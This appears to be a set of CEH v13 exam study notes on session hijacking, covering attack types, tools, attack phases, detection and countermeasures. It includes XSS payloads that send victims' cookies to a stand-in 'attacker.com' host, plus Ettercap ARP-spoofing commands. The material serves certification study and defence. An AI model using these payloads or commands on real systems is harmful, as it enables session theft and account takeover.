# CEH v13 Session Hijacking - Complete Study Notes

## Table of Contents
1. [Session Hijacking Overview](#session-hijacking-overview)
2. [Types of Session Hijacking](#types-of-session-hijacking)
3. [Session Hijacking Techniques](#session-hijacking-techniques)
4. [Network Level Hijacking](#network-level-hijacking)
5. [Application Level Hijacking](#application-level-hijacking)
6. [Session Hijacking Tools](#session-hijacking-tools)
7. [Session Hijacking Process](#session-hijacking-process)
8. [Session Token Analysis](#session-token-analysis)
9. [Attack Scenarios](#attack-scenarios)
10. [Detection Methods](#detection-methods)
11. [Countermeasures and Prevention](#countermeasures-and-prevention)
12. [Exam-Focused Key Points](#exam-focused-key-points)

---

## Session Hijacking Overview

### Definition
Session hijacking is the exploitation of a valid computer session where an attacker takes over an active session between two computers by stealing or predicting a valid session token.

### Key Concepts
- **Session**: Communication exchange between two devices
- **Session ID/Token**: Unique identifier for each session
- **Session State**: Information about the current session
- **Session Timeout**: Period after which a session expires

### Why Sessions Are Targeted
- Sessions maintain authentication state
- Once hijacked, attacker gains authorized access
- Bypass authentication mechanisms
- Access sensitive data and functionalities

---

## Types of Session Hijacking

### 1. Active vs Passive Hijacking

#### Active Hijacking
- Attacker actively takes control of the session
- Victim's connection is terminated
- Attacker assumes the role of the legitimate user
- **Examples**: TCP RST attacks, Connection termination

#### Passive Hijacking
- Attacker monitors and captures session data
- Original session remains intact
- Attacker gains information without disrupting communication
- **Examples**: Packet sniffing, Traffic monitoring

### 2. Network Level vs Application Level

#### Network Level Hijacking
- Targets network protocols (TCP, UDP)
- Operates at OSI Layer 3-4
- **Focus**: IP addresses, port numbers, sequence numbers

#### Application Level Hijacking
- Targets application layer protocols (HTTP, HTTPS)
- Operates at OSI Layer 7
- **Focus**: Session cookies, tokens, application-specific identifiers

---

## Session Hijacking Techniques

### 1. Session Prediction
- **Method**: Analyzing session token patterns
- **Target**: Predictable session IDs
- **Tools**: Custom scripts, Burp Suite
- **Vulnerability**: Weak session generation algorithms

### 2. Session Sidejacking (Session Sniffing)
- **Method**: Capturing unencrypted session tokens
- **Requirement**: Network access (same subnet/WiFi)
- **Tools**: Wireshark, Firesheep, Ettercap
- **Vulnerability**: Unencrypted HTTP communications

### 3. Cross-Site Scripting (XSS) for Session Theft
- **Method**: Injecting malicious JavaScript to steal cookies
- **Payload Example**: `<script>document.location='http://attacker.com/cookie.php?c='+document.cookie</script>`
- **Target**: Web applications with XSS vulnerabilities

### 4. Man-in-the-Middle (MITM)
- **Method**: Intercepting communication between client and server
- **Techniques**: ARP spoofing, DNS spoofing, Rogue access points
- **Tools**: Ettercap, Bettercap, MITMproxy

### 5. Session Fixation
- **Method**: Forcing victim to use attacker-controlled session ID
- **Process**: 
  1. Attacker obtains valid session ID
  2. Tricks victim into authenticating with this ID
  3. Attacker uses the same ID to access victim's account

---

## Network Level Hijacking

### TCP Hijacking Techniques

#### 1. TCP Sequence Prediction
- **Concept**: Predicting next sequence number
- **Process**:
  1. Analyze TCP sequence patterns
  2. Predict next expected sequence number
  3. Inject packets with correct sequence
- **Difficulty**: Modern systems use random sequence numbers

#### 2. TCP RST Attack
- **Method**: Sending forged RST packets
- **Purpose**: Terminate victim's connection
- **Result**: Attacker can establish new connection

#### 3. TCP ACK Storm
- **Problem**: Occurs when both victim and attacker send packets
- **Solution**: Attacker must handle or prevent ACK storms

### UDP Hijacking
- **Easier than TCP**: No sequence numbers or connection state
- **Method**: Simply send packets from spoofed source
- **Common targets**: DNS queries, DHCP requests

### ICMP Redirection
- **Method**: Send forged ICMP redirect messages
- **Purpose**: Redirect traffic through attacker's machine
- **Requirements**: Network administrator privileges on intermediate router

---

## Application Level Hijacking

### HTTP Session Hijacking

#### Cookie-Based Sessions
- **Target**: Session cookies (JSESSIONID, PHPSESSID, ASP.NET_SessionId)
- **Methods**:
  - Cookie theft via XSS
  - Cookie interception (HTTP traffic)
  - Cookie prediction/brute force

#### URL-Based Sessions
- **Target**: Session ID in URL parameters
- **Vulnerabilities**:
  - Session ID exposed in browser history
  - Session ID in server logs
  - Session ID shared via referrer headers

### HTTPS Session Hijacking
- **Challenge**: Encrypted traffic
- **Methods**:
  - SSL stripping attacks
  - Certificate-based MITM
  - Application-layer vulnerabilities
  - Session fixation

### Browser-Based Attacks

#### Man-in-the-Browser (MITB)
- **Method**: Malware in victim's browser
- **Capabilities**: Modify transactions in real-time
- **Examples**: Banking trojans, Browser extensions

#### Cross-Site Request Forgery (CSRF)
- **Method**: Force victim to perform unwanted actions
- **Requirement**: Victim must be authenticated
- **Protection**: CSRF tokens

---

## Session Hijacking Tools

### Network Sniffing Tools
1. **Wireshark**
   - GUI-based packet analyzer
   - Filter: `http.cookie` or `tcp.stream eq X`
   - Can extract session cookies from HTTP traffic

2. **tcpdump**
   - Command-line packet capture
   - Example: `tcpdump -i eth0 -s 0 -w capture.pcap`

3. **Ettercap**
   - MITM attack framework
   - Features: ARP spoofing, SSL stripping, packet injection
   - Usage: `ettercap -T -i eth0 -M arp:remote /target_ip/ /gateway_ip/`

### Web Application Testing Tools
1. **Burp Suite**
   - **Key Features**: Proxy, Scanner, Repeater, Sequencer
   - **Session Analysis**: Sequencer tool for token randomness
   - **Cookie manipulation**: Proxy interceptor

2. **OWASP ZAP**
   - Free alternative to Burp Suite
   - Session management testing
   - Automated vulnerability scanning

3. **Cookie Cadger**
   - Specialized for HTTP cookie interception
   - Works with wireless networks
   - Integrates with Wireshark

### Specialized Session Hijacking Tools
1. **Firesheep**
   - Browser extension (deprecated)
   - Simplified session sidejacking on WiFi
   - Educational tool for demonstrating risks

2. **Hamster & Ferret**
   - Ferret: Captures HTTP cookies and sessions
   - Hamster: Proxy that uses captured sessions
   - Usage: `ferret -i eth0 -o session.txt`

3. **Session Hijacking Tools in Kali Linux**
   - **dsniff suite**: Contains various session hijacking tools
   - **hunt**: Interactive session hijacking tool
   - **T50**: Packet injector for various protocols

### Custom Scripts and Frameworks
1. **Python Scripts**
   ```python
   # Example session cookie extraction
   import requests
   import re
   
   def extract_session_cookie(response):
       cookies = response.headers.get('Set-Cookie')
       session_id = re.search(r'JSESSIONID=([^;]+)', cookies)
       return session_id.group(1) if session_id else None
   ```

2. **Metasploit Modules**
   - `auxiliary/scanner/http/cookie_flags`
   - `auxiliary/scanner/http/enum_wayback`

---

## Session Hijacking Process

### Phase 1: Reconnaissance
1. **Target Identification**
   - Identify target applications/services
   - Map network topology
   - Identify session management mechanisms

2. **Traffic Analysis**
   - Monitor network traffic
   - Identify session tokens
   - Analyze token generation patterns

### Phase 2: Session Token Acquisition
1. **Passive Methods**
   - Packet sniffing on shared networks
   - Monitoring HTTP traffic
   - Log file analysis

2. **Active Methods**
   - MITM attacks
   - XSS exploitation
   - Session fixation attacks

### Phase 3: Session Validation
1. **Token Testing**
   - Verify token is still valid
   - Check token privileges
   - Test token scope

### Phase 4: Session Exploitation
1. **Access Target Resources**
   - Use hijacked session to access protected resources
   - Perform unauthorized actions
   - Extract sensitive data

### Phase 5: Maintaining Access
1. **Session Persistence**
   - Monitor session timeout
   - Refresh tokens when needed
   - Avoid detection

---

## Session Token Analysis

### Token Entropy Analysis
1. **Randomness Testing**
   - Statistical tests for randomness
   - Pattern detection
   - Predictability assessment

2. **Tools for Analysis**
   - **Burp Suite Sequencer**: Analyze token randomness
   - **Custom scripts**: Statistical analysis
   - **NIST tests**: Comprehensive randomness testing

### Common Token Weaknesses
1. **Insufficient Randomness**
   - Sequential tokens
   - Predictable patterns
   - Insufficient entropy

2. **Information Disclosure**
   - Timestamps in tokens
   - User information encoded
   - System information leakage

3. **Token Reuse**
   - Same token across multiple sessions
   - Token not invalidated after logout
   - Long-lived tokens

### Session Token Formats
1. **Base64 Encoded**
   - Easy to decode and analyze
   - Often contains readable information
   - Example: `VXNlcklEOjEyMzQ1`

2. **Hexadecimal**
   - Common format for session IDs
   - Example: `A1B2C3D4E5F6`

3. **Encrypted Tokens**
   - More secure but may have implementation flaws
   - JWT tokens with weak signatures

---

## Attack Scenarios

### Scenario 1: WiFi Coffee Shop Attack
1. **Setup**: Attacker on same WiFi network
2. **Method**: Packet sniffing for HTTP cookies
3. **Tools**: Wireshark, Cookie Cadger
4. **Result**: Access to victim's web accounts

### Scenario 2: Corporate Network Insider
1. **Setup**: Malicious employee with network access
2. **Method**: ARP spoofing + session capture
3. **Tools**: Ettercap, custom scripts
4. **Result**: Access to internal applications

### Scenario 3: Web Application XSS
1. **Setup**: Web application with XSS vulnerability
2. **Method**: Inject cookie-stealing script
3. **Payload**: `<script>new Image().src="http://attacker.com/c.php?c="+document.cookie</script>`
4. **Result**: Remote session hijacking

### Scenario 4: SSL Stripping Attack
1. **Setup**: MITM position on network
2. **Method**: Downgrade HTTPS to HTTP
3. **Tools**: SSLstrip, Bettercap
4. **Result**: Capture of encrypted session data

---

## Detection Methods

### Network-Based Detection
1. **Anomaly Detection**
   - Unusual traffic patterns
   - Multiple sessions from same user
   - Geographic anomalies

2. **Signature-Based Detection**
   - Known attack patterns
   - Malicious packet signatures
   - Tool fingerprints

### Application-Based Detection
1. **Session Monitoring**
   - Concurrent session detection
   - IP address changes
   - User agent changes

2. **Behavioral Analysis**
   - Unusual access patterns
   - Privilege escalation attempts
   - Rapid resource access

### Tools for Detection
1. **Network IDS/IPS**
   - Snort rules for session hijacking
   - Suricata signatures
   - Custom detection scripts

2. **Web Application Firewalls (WAF)**
   - Session protection features
   - Cookie security enforcement
   - Real-time monitoring

3. **SIEM Solutions**
   - Log correlation
   - Behavioral analytics
   - Automated response

---

## Countermeasures and Prevention

### Network Level Protections
1. **Encryption**
   - **TLS/SSL**: Encrypt all communications
   - **VPN**: Secure tunneling
   - **WPA3**: Strong WiFi encryption

2. **Network Segmentation**
   - Isolate sensitive systems
   - Implement VLANs
   - Control network access

### Application Level Protections
1. **Secure Session Management**
   ```
   Best Practices:
   - Generate random session IDs
   - Use sufficient entropy (128+ bits)
   - Implement session timeout
   - Regenerate session ID after login
   - Secure cookie attributes (HttpOnly, Secure, SameSite)
   ```

2. **Cookie Security Attributes**
   - **HttpOnly**: Prevent JavaScript access
   - **Secure**: Require HTTPS transmission
   - **SameSite**: Prevent CSRF attacks
   - **Domain/Path**: Restrict cookie scope

3. **Additional Security Headers**
   ```
   Security Headers:
   - X-Frame-Options: DENY
   - X-XSS-Protection: 1; mode=block
   - Content-Security-Policy: strict directives
   - Strict-Transport-Security: max-age=31536000
   ```

### Implementation Best Practices
1. **Session Token Generation**
   ```python
   # Secure session token generation
   import secrets
   import hashlib
   import time
   
   def generate_session_token():
       random_data = secrets.token_bytes(32)
       timestamp = str(time.time()).encode()
       combined = random_data + timestamp
       return hashlib.sha256(combined).hexdigest()
   ```

2. **Session Validation**
   - Validate on every request
   - Check token format and length
   - Verify token hasn't expired
   - Validate against stored sessions

3. **Session Termination**
   - Clear session on logout
   - Implement absolute timeout
   - Clear sensitive data from memory

### Organizational Measures
1. **Security Policies**
   - Session management standards
   - Secure coding guidelines
   - Regular security training

2. **Monitoring and Logging**
   - Log all session activities
   - Monitor for suspicious patterns
   - Implement alerting systems

3. **Regular Security Testing**
   - Penetration testing
   - Code reviews
   - Automated security scanning

---

## Exam-Focused Key Points

### Critical Concepts for CEH v13
1. **Types of Hijacking**
   - Active vs Passive
   - Network vs Application level
   - TCP vs UDP hijacking

2. **Key Tools** (High Priority)
   - **Burp Suite**: Most emphasized in exam
   - **Wireshark**: Packet analysis and filtering
   - **Ettercap**: MITM and ARP spoofing

3. **Attack Methods** (Must Know)
   - Session sidejacking on WiFi networks
   - XSS-based cookie theft
   - Session fixation attacks
   - TCP sequence prediction

### Common Exam Question Patterns
1. **Tool Identification**
   - "Which tool is best for analyzing session token randomness?"
   - Answer: Burp Suite Sequencer

2. **Attack Classification**
   - "What type of attack involves predicting TCP sequence numbers?"
   - Answer: TCP Hijacking/Network Level Hijacking

3. **Countermeasure Selection**
   - "What is the best protection against session sidejacking?"
   - Answer: Use HTTPS/SSL encryption

4. **Detection Methods**
   - "How can you detect session hijacking attempts?"
   - Answer: Monitor for concurrent sessions, IP changes, behavioral anomalies

### Important Technical Details
1. **Cookie Attributes**
   - Know the purpose of HttpOnly, Secure, SameSite
   - Understand when each should be used

2. **Session Token Analysis**
   - Entropy requirements (128+ bits)
   - Common weaknesses (predictable patterns)
   - Tools for analysis (Burp Sequencer)

3. **Network Protocols**
   - TCP sequence numbers and their importance
   - Why UDP is easier to hijack than TCP
   - ICMP redirect attacks

### Hands-On Skills to Practice
1. **Wireshark Filtering**
   - `http.cookie` - Filter for HTTP cookies
   - `tcp.stream eq X` - Follow TCP streams
   - `http contains "JSESSIONID"` - Find specific session IDs

2. **Burp Suite Operations**
   - Intercept and modify session cookies
   - Use Sequencer for token analysis
   - Replay attacks with Repeater

3. **Ettercap Commands**
   ```bash
   # Basic MITM setup
   ettercap -T -i eth0 -M arp:remote /target_ip/ /gateway_ip/
   
   # With plugin for specific attacks
   ettercap -T -i eth0 -M arp -P find_ettercap /target_ip/ /gateway_ip/
   ```

### Quick Reference for Exam
| Attack Type | Tool | Target | Difficulty |
|-------------|------|--------|------------|
| Session Sidejacking | Wireshark/Firesheep | HTTP cookies | Easy |
| TCP Hijacking | Hunt/Custom scripts | TCP connections | Hard |
| XSS Cookie Theft | Browser/Burp Suite | Web applications | Medium |
| Session Fixation | Manual/Burp Suite | Login mechanisms | Medium |
| MITM | Ettercap/Bettercap | Network traffic | Medium |

### Key Formulas and Calculations
1. **Session Token Entropy**
   - Minimum entropy: 128 bits
   - Formula: Entropy = log₂(possible_values)
   - Example: 32-character hex = log₂(16³²) = 128 bits

2. **Session Timeout Calculations**
   - Idle timeout: 15-30 minutes (standard)
   - Absolute timeout: 2-8 hours (based on sensitivity)

---

## Summary Checklist for CEH v13 Exam

### Must-Know Topics ✓
- [ ] Definition and types of session hijacking
- [ ] Network level vs application level attacks
- [ ] TCP hijacking techniques and sequence prediction
- [ ] Session sidejacking on wireless networks
- [ ] XSS-based session token theft
- [ ] Session fixation attacks
- [ ] Key tools: Burp Suite, Wireshark, Ettercap
- [ ] Cookie security attributes
- [ ] Detection and prevention methods
- [ ] Common attack scenarios

### Tools to Master ✓
- [ ] Burp Suite (especially Sequencer and Proxy)
- [ ] Wireshark (HTTP filtering and stream following)
- [ ] Ettercap (MITM attacks)
- [ ] Basic understanding of other tools (tcpdump, Cookie Cadger)

### Practical Skills ✓
- [ ] Identify session tokens in HTTP traffic
- [ ] Analyze session token randomness
- [ ] Perform basic packet sniffing
- [ ] Understand MITM attack setup
- [ ] Configure secure session management

---

**Note**: This comprehensive guide covers all essential session hijacking concepts for CEH v13. Focus on understanding the practical application of tools and techniques, as the exam emphasizes hands-on knowledge alongside theoretical concepts.